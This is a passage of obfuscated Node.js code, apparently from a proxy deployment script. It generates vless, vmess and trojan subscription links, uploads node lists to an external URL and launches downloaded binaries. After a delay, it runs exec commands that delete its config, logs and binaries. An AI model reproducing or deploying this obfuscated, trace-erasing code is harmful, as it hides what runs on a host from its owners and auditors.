_0x47e066[_0x5146e7(_0x571431._0x4dcf49)][_0x5146e7(_0x571431._0x5a3d45)]+'_'+_0x47e066[_0x5146e7(0x22e)][_0x5146e7(_0x571431._0x36a54a)];}catch(_0x56cb68){}}return'Unknown';}async function _0x58beeb(_0x230151){const _0x468320={_0x11993f:0x250,_0x394ed8:0x204,_0x33a177:0x1e1,_0x106ad4:0x1f3,_0x4843d4:0x1ee,_0x5255af:0x209,_0xdb2705:0x220,_0x352df0:0x1d2,_0x51d59f:0x22f},_0x40cc6a=await _0x1cbdae(),_0x4563fe=NAME?NAME+'-'+_0x40cc6a:_0x40cc6a;return new Promise(_0x32d3fe=>{setTimeout(()=>{const _0x47c30d={_0x2e0583:0x235,_0x18e680:0x288},_0x4b64b9=_0x1dc7,_0x2be377={'v':'2','ps':''+_0x4563fe,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x4b64b9(_0x468320._0x11993f),'host':_0x230151,'path':_0x4b64b9(_0x468320._0x394ed8),'tls':_0x4b64b9(0x21d),'sni':_0x230151,'alpn':'','fp':_0x4b64b9(_0x468320._0x33a177)},_0x5ced5c='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x230151+_0x4b64b9(0x1ee)+_0x230151+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x4563fe+_0x4b64b9(0x203)+Buffer['from'](JSON[_0x4b64b9(0x22a)](_0x2be377))['toString'](_0x4b64b9(_0x468320._0x106ad4))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x4b64b9(0x27d)+_0x230151+_0x4b64b9(_0x468320._0x4843d4)+_0x230151+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x4563fe+_0x4b64b9(_0x468320._0x5255af);console[_0x4b64b9(0x26f)](Buffer[_0x4b64b9(0x23d)](_0x5ced5c)[_0x4b64b9(0x1f1)]('base64')),fs[_0x4b64b9(_0x468320._0xdb2705)](subPath,Buffer['from'](_0x5ced5c)[_0x4b64b9(0x1f1)](_0x4b64b9(0x1f3))),console[_0x4b64b9(0x26f)](FILE_PATH+_0x4b64b9(_0x468320._0x352df0)),uploadNodes(),app[_0x4b64b9(_0x468320._0x51d59f)]('/'+SUB_PATH,(_0x1ff747,_0x39b9e5)=>{const _0x4b2031=_0x4b64b9,_0x558e6d=Buffer[_0x4b2031(0x23d)](_0x5ced5c)[_0x4b2031(0x1f1)]('base64');_0x39b9e5[_0x4b2031(_0x47c30d._0x2e0583)](_0x4b2031(0x1d8),_0x4b2031(0x256)),_0x39b9e5[_0x4b2031(_0x47c30d._0x18e680)](_0x558e6d);}),_0x32d3fe(_0x5ced5c);},0x7d0);});}}async function uploadNodes(){const _0xac0c84={_0x1591c1:0x282,_0x45300e:0x1e9,_0x2c2dc3:0x240,_0x4d6e21:0x1de,_0x290e60:0x22a,_0x3a3197:0x245,_0x2fdc55:0x276,_0x2d82fe:0x27f},_0x14b8b6=_0x10dc0d;if(UPLOAD_URL&&PROJECT_URL){const _0x2bf159=PROJECT_URL+'/'+SUB_PATH,_0x49bef1={'subscription':[_0x2bf159]};try{const _0x41c136=await axios['post'](UPLOAD_URL+_0x14b8b6(_0xac0c84._0x1591c1),_0x49bef1,{'headers':{'Content-Type':'application/json'}});return _0x41c136&&_0x41c136[_0x14b8b6(_0xac0c84._0x45300e)]===0xc8?(console[_0x14b8b6(0x26f)](_0x14b8b6(0x264)),_0x41c136):null;}catch(_0x155182){if(_0x155182[_0x14b8b6(_0xac0c84._0x2c2dc3)]){if(_0x155182[_0x14b8b6(0x240)][_0x14b8b6(0x1e9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xbd7c37=fs[_0x14b8b6(0x261)](listPath,'utf-8'),_0x4df659=_0xbd7c37[_0x14b8b6(_0xac0c84._0x4d6e21)]('\x0a')['filter'](_0x581ace=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x14b8b6(0x23c)](_0x581ace));if(_0x4df659['length']===0x0)return;const _0x3557db=JSON[_0x14b8b6(_0xac0c84._0x290e60)]({'nodes':_0x4df659});try{const _0x1417a9=await axios[_0x14b8b6(_0xac0c84._0x3a3197)](UPLOAD_URL+_0x14b8b6(_0xac0c84._0x2fdc55),_0x3557db,{'headers':{'Content-Type':'application/json'}});return _0x1417a9&&_0x1417a9['status']===0xc8?(console['log'](_0x14b8b6(_0xac0c84._0x2d82fe)),_0x1417a9):null;}catch(_0x5597da){return null;}}else return;}}function cleanFiles(){const _0x2d3e7e={_0x26d2e8:0x1df,_0x5ee6b9:0x279,_0x28d9e7:0x1f9,_0x3e9f9a:0x219,_0x2cbf03:0x1f9,_0x18e4ef:0x258},_0x44e055={_0x3b9b44:0x207,_0x1b2d79:0x1da,_0x6ae699:0x25e};setTimeout(()=>{const _0x245a01={_0xab22b3:0x207,_0x19fa8e:0x26f},_0x38b18d=_0x1dc7,_0x55c8cd=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x55c8cd[_0x38b18d(_0x2d3e7e._0x26d2e8)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x55c8cd[_0x38b18d(0x1df)](phpPath);process[_0x38b18d(0x223)]==='win32'?exec(_0x38b18d(_0x2d3e7e._0x5ee6b9)+_0x55c8cd[_0x38b18d(_0x2d3e7e._0x28d9e7)]('\x20')+_0x38b18d(0x210),_0x2e44a8=>{const _0x494559=_0x38b18d;console[_0x494559(_0x245a01._0xab22b3)](),console[_0x494559(0x26f)]('App\x20is\x20running'),console[_0x494559(_0x245a01._0x19fa8e)](_0x494559(0x25e));}):exec(_0x38b18d(_0x2d3e7e._0x3e9f9a)+_0x55c8cd[_0x38b18d(_0x2d3e7e._0x2cbf03)]('\x20')+_0x38b18d(_0x2d3e7e._0x18e4ef),_0x399ceb=>{const _0x1e5fd6=_0x38b18d;console[_0x1e5fd6(_0x44e055._0x3b9b44)](),console[_0x1e5fd6(0x26f)](_0x1e5fd6(_0x44e055._0x1b2d79)),console[_0x1e5fd6(0x26f)](_0x1e5fd6(_0x44e055._0x6ae699));});},0x15f90);}function _0x1dc7(_0x4c7df3,_0x5d4c7a){const _0x3e260d=_0x3e26();return _0x1dc7=function(_0x1dc7da,_0x2e168e){_0x1dc7da=_0x1dc7da-0x1d1;let _0x3ddc40=_0x3e260d[_0x1dc7da];return _0x3ddc40;},_0x1dc7(_0x4c7df3,_0x5d4c7a);}cleanFiles();async function AddVisitTask(){const _0x1511d6={_0x2f1c69:0x26f,_0x38cbfe:0x245,_0xa0f0a4:0x262,_0x359a90:0x228},_0xa73fb2=_0x10dc0d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xa73fb2(_0x1511d6._0x2f1c69)](_0xa73fb2(0x25d));return;}try{const _0x5a5e44=await axios[_0xa73fb2(_0x1511d6._0x38cbfe)](_0xa73fb2(_0x1511d6._0xa0f0a4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xa73fb2(_0x1511d6._0x359a90)}});return console[_0xa73fb2(_0x1511d6._0x2f1c69)](_0xa73fb2(0x231)),_0x5a5e44;}catch(_0x29dfe8){return console[_0xa73fb2(0x291)](_0xa73fb2(0x1d6)+_0x29dfe8[_0xa73fb2(0x239)]),null;}}async function startserver(){const _0x519cc6={_0x54bd25:0x291},_0x3d650a=_0x10dc0d;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3851a6){console[_0x3d650a(_0x519cc6._0x54bd25)]('Error\x20in\x20startserver:',_0x3851a6);}}startserver()[_0x10dc0d(0x25f)](_0x2e1f95=>{const _0x33abfe={_0x21bc8c:0x291},_0x43d108=_0x10dc0d;console[_0x43d108(_0x33abfe._0x21bc8c)](_0x43d108(0x218),_0x2e1f95);}),app['listen'](PORT,()=>console[_0x10dc0d(0x26f)](_0x10dc0d(0x27c)+PORT+'!'));
